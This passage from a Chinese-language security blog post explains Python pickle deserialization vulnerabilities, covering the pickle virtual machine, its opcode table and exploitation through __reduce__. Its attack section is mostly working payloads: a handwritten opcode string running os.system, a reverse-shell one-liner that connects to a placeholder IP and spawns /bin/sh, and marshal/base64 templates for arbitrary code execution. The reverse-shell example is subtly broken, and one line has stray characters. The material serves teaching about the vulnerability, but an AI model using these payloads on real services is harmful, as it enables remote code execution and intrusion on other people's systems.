class="string">&#x27;h3rmesk1t&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] 序列化&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] 反序列化&#x27;</span>)sssssssss</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(pickle.dumps(Demo())).name)</span><br></pre></td></tr></table></figure><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/python_01.png" alt=""></p><h1 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h1><h2 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h2><p><code>PVM</code>由三个部分组成:</p><ul><li>指令处理器: 从流中读取<code>opcode</code>和参数, 并对其进行解释处理. 重复这个动作, 直到遇到<code>.</code>这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回.</li><li>栈区(<code>stack</code>): 由<code>Python</code>的<code>list</code>实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果.</li><li>标签区(<code>memo</code>): 由<code>Python</code>的<code>dict</code>实现, 为<code>PVM</code>的整个生命周期提供存储.</li></ul><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><p>首先, <code>PVM</code>会把源代码编译成字节码, 字节码是<code>Python</code>语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果<code>Python</code>进程在主机上有写入权限, 那么它会把程序字节码保存为一个以<code>.pyc</code>为扩展名的文件. 如果没有写入权限, 则<code>Python</code>进程会在内存中生成字节码, 在程序执行结束后被自动丢弃.</p><p>一般来说, 在构建程序时最好给<code>Python</code>进程在主机上的写入权限, 这样只要源代码没有改变, 生成的<code>.pyc</code>文件就可以被重复利用, 提高执行效率, 同时隐藏源代码.</p><p>然后, <code>Python</code>进程会把编译好的字节码转发到<code>PVM</code>(<code>Python</code>虚拟机)中, <code>PVM</code>会循环迭代执行字节码指令, 直到所有操作被完成.</p><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><p><strong>opcode</strong></p><p>也就是操作码，opcode是序列化内容的核心</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span></span><br><span class="line"><span class="comment"># here is in kind-of alphabetical order of 1-character pickle code.</span></span><br><span class="line"><span class="comment"># pickletools groups them by purpose.</span></span><br><span class="line"></span><br><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 2</span></span><br><span class="line"></span><br><span class="line">PROTO          = <span class="string">b&#x27;\x80&#x27;</span>  <span class="comment"># identify pickle protocol</span></span><br><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line">EXT1           = <span class="string">b&#x27;\x82&#x27;</span>  <span class="comment"># push object from extension registry; 1-byte index</span></span><br><span class="line">EXT2           = <span class="string">b&#x27;\x83&#x27;</span>  <span class="comment"># ditto, but 2-byte index</span></span><br><span class="line">EXT4           = <span class="string">b&#x27;\x84&#x27;</span>  <span class="comment"># ditto, but 4-byte index</span></span><br><span class="line">TUPLE1         = <span class="string">b&#x27;\x85&#x27;</span>  <span class="comment"># build 1-tuple from stack top</span></span><br><span class="line">TUPLE2         = <span class="string">b&#x27;\x86&#x27;</span>  <span class="comment"># build 2-tuple from two topmost stack items</span></span><br><span class="line">TUPLE3         = <span class="string">b&#x27;\x87&#x27;</span>  <span class="comment"># build 3-tuple from three topmost stack items</span></span><br><span class="line">NEWTRUE        = <span class="string">b&#x27;\x88&#x27;</span>  <span class="comment"># push True</span></span><br><span class="line">NEWFALSE       = <span class="string">b&#x27;\x89&#x27;</span>  <span class="comment"># push False</span></span><br><span class="line">LONG1          = <span class="string">b&#x27;\x8a&#x27;</span>  <span class="comment"># push long from &lt; 256 bytes</span></span><br><span class="line">LONG4          = <span class="string">b&#x27;\x8b&#x27;</span>  <span class="comment"># push really big long</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"></span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 4</span></span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = <span class="string">b&#x27;\x8c&#x27;</span>  <span class="comment"># push short string; UTF-8 length &lt; 256 bytes</span></span><br><span class="line">BINUNICODE8      = <span class="string">b&#x27;\x8d&#x27;</span>  <span class="comment"># push very long string</span></span><br><span class="line">BINBYTES8        = <span class="string">b&#x27;\x8e&#x27;</span>  <span class="comment"># push very long bytes string</span></span><br><span class="line">EMPTY_SET        = <span class="string">b&#x27;\x8f&#x27;</span>  <span class="comment"># push empty set on the stack</span></span><br><span class="line">ADDITEMS         = <span class="string">b&#x27;\x90&#x27;</span>  <span class="comment"># modify set by adding topmost stack items</span></span><br><span class="line">FROZENSET        = <span class="string">b&#x27;\x91&#x27;</span>  <span class="comment"># build frozenset from topmost stack items</span></span><br><span class="line">NEWOBJ_EX        = <span class="string">b&#x27;\x92&#x27;</span>  <span class="comment"># like NEWOBJ but work with keyword only arguments</span></span><br><span class="line">STACK_GLOBAL     = <span class="string">b&#x27;\x93&#x27;</span>  <span class="comment"># same as GLOBAL but using names on the stacks</span></span><br><span class="line">MEMOIZE          = <span class="string">b&#x27;\x94&#x27;</span>  <span class="comment"># store top of the stack in memo</span></span><br><span class="line">FRAME            = <span class="string">b&#x27;\x95&#x27;</span>  <span class="comment"># indicate the beginning of a new frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 5</span></span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = <span class="string">b&#x27;\x96&#x27;</span>  <span class="comment"># push bytearray</span></span><br><span class="line">NEXT_BUFFER      = <span class="string">b&#x27;\x97&#x27;</span>  <span class="comment"># push next out-of-band buffer</span></span><br><span class="line">READONLY_BUFFER  = <span class="string">b&#x27;\x98&#x27;</span>  <span class="comment"># make top of stack readonly</span></span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>指令</th><th>描述</th><th>具体写法</th><th>栈上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、\’等python字符串形式）</td><td>获得的对象入栈</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td></tr></tbody></table></div><p>要想真正的利用反序列化，我们还得从底层了解一下pickle数据的格式是什么样的。</p><ul><li><code>c</code> 读取新的一行作为模块名<code>module</code>，读取下一行作为对象名<code>object</code>，然后将<code>module.object</code>压入到堆栈中。</li><li><code>(</code> 将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。</li><li><code>t</code> 从堆栈中弹出对象，直到一个(被弹出，并创建一个包含弹出对象（除了(）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。</li><li><code>S</code> 读取引号中的字符串直到换行符处，然后将它压入堆栈。</li><li><code>R</code> 将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。</li><li><code>.</code> 结束pickle</li></ul><p>简单说来就是：</p><ul><li><code>c</code> 以c开始的后面两行的作用类似<code>os.system</code>的调用，其中<code>cos</code>在第一行，<code>system</code>在第二行。</li><li><code>(</code> 相当于左括号</li><li><code>t</code> 相当于右括号</li><li><code>S</code> 表示本行的内容一个字符串</li><li><code>R</code> 执行紧靠自己左边的一个括号对（即( 和t之间）的内容</li><li><code>.</code> 代表该pickle结束</li></ul><p>举个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>上文中的字节码其实就是<code>os.system(&#39;whoami&#39;)</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cos         =&gt;  引入模块 os.</span><br><span class="line">system      =&gt;  引用 system, 并将其添加到 stack.</span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span>  =&gt;  把当前 stack 存到 metastack, 清空 stack, 再将 <span class="string">&#x27;whoami&#x27;</span> 压入 stack.</span><br><span class="line">t           =&gt;  stack 中的值弹出并转为 <span class="built_in">tuple</span>, 把 metastack 还原到 stack, 再将 <span class="built_in">tuple</span> 压入 stack.</span><br><span class="line">R           =&gt;  system(*(<span class="string">&#x27;whoami&#x27;</span>,)).</span><br><span class="line">.           =&gt;  结束并返回当前栈顶元素.</span><br></pre></td></tr></table></figure><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="漏洞常出现的地方"><a href="#漏洞常出现的地方" class="headerlink" title="漏洞常出现的地方"></a>漏洞常出现的地方</h2><ol><li>通常在解析认证<code>token</code>, <code>session</code>的时候. 现在很多<code>Web</code>服务都使用<code>redis</code>、<code>mongodb</code>、<code>memcached</code>等来存储<code>session</code>等状态信息.</li><li>可能将对象<code>Pickle</code>后存储成磁盘文件.</li><li>可能将对象<code>Pickle</code>后在网络中传输.</li></ol><h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化, 反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码.</p><p>简单来说, <code>__reduce__()</code>魔术方法类似于<code>PHP</code>中的<code>__wakeup()</code>方法, 在反序列化时会先调用<code>__reduce__()</code>魔术方法.</p><ul><li><p>如果返回值是一个字符串, 那么将会去当前作用域中查找字符串值对应名字的对象, 将其序列化之后返回.</p></li><li><p>如果返回值是一个元组, 要求是2到6个参数(Python3.8新加入元组的第六项).</p><ol><li>第一个参数是可调用的对象.</li><li>第二个是该对象所需的参数元组, 如果可调用对象不接受参数则必须提供一个空元组.</li><li>第三个是用于表示对象的状态的可选元素, 将被传给前述的<code>__setstate__()</code>方法, 如果对象没有此方法, 则这个元素必须是字典类型并会被添加至<code>__dict__</code>属性中.</li><li>第四个是用于返回连续项的迭代器的可选元素.</li><li>第五个是用于返回连续键值对的迭代器的可选元素.</li><li>第六个是一个带有<code>(obj, state)</code>签名的可调用对象的可选元素.</li></ol></li></ul><p><strong>举个例子</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">pickle.loads(pickle.dumps(demo))</span><br></pre></td></tr></table></figure><p>可以看到成功执行了命令：</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/python_02.png" alt=""></p><p>反弹shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;shell&#x27;</span>,))    </span><br><span class="line">a=Demo()</span><br><span class="line">result = pickle.dumps(a)</span><br><span class="line">pickle.loads(result)</span><br></pre></td></tr></table></figure><h2 id="Marshal-反序列化（任意代码执行）"><a href="#Marshal-反序列化（任意代码执行）" class="headerlink" title="Marshal 反序列化（任意代码执行）"></a>Marshal 反序列化（任意代码执行）</h2><p>由于<code>pickle</code>无法序列化<code>code</code>对象, 因此在<code>python2.6</code>后增加了一个<code>marshal</code>模块来处理<code>code</code>对象的序列化问题.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>():</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    os.system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(demo()))</span><br><span class="line"><span class="built_in">print</span>(code_serialized)</span><br></pre></td></tr></table></figure><p>但是<code>marshal</code>不能直接使用<code>__reduce__</code>, 因为<code>reduce</code>是利用调用某个<code>callable</code>并传递参数来执行的, 而<code>marshal</code>函数本身就是一个<code>callable</code>, 需要执行它, 而不是将他作为某个函数的参数.</p><p>这时候就要利用上面分析的那个<code>PVM</code>操作码来进行构造了, 先写出来需要执行的内容, <code>Python</code>能通过<code>types.FunctionTyle(func_code,globals(),&#39;&#39;)()</code>来动态地创建匿名函数, 这一部分的内容可以看<a href="https://docs.python.org/3/library/types.html">官方文档</a>的介绍.</p><p>结合上文的示例代码, 最重要执行的是: <code>(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), &#39;&#39;))()</code>.</p><p><strong>payload模板（python2）：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    os.system(<span class="string">&#x27;whoami;/bin/sh&#x27;</span>)     <span class="comment"># evil code</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(shell))</span><br></pre></td></tr></table></figure><p>这样我们可以用如下脚本构造payload，再根据实际情况对payload进行url编码之类的操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>():</span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># any code here</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(code.func_code))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
